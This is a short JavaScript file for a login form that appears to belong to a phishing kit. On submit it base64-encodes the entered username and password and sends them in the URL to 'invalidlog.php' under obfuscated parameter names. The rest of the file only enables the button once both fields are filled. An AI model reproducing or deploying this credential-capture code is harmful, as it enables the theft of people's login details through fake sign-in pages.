


document.getElementById('next').onclick = function () {
    var username = document.getElementById("loginuser").value;
    var password = document.getElementById("loginpassword").value;
    window.location.href="invalidlog.php?YWhkaGFzaGFzaGFocw="+btoa(username)+"&WFqaWFqc2RpamFpamFqYWlkan="+btoa(password);
}

function length_disabled_btn(value){
       var username = document.getElementById("loginuser").value;
       var password = document.getElementById("loginpassword").value;
       var login = username.toString().length;
       var slogin = password.toString().length;
         if(login > 0){
              if(slogin > 0){
                 document.getElementById("next").disabled = false;              
              }
         
              } else{
                document.getElementById("next").disabled = true;
              }
}
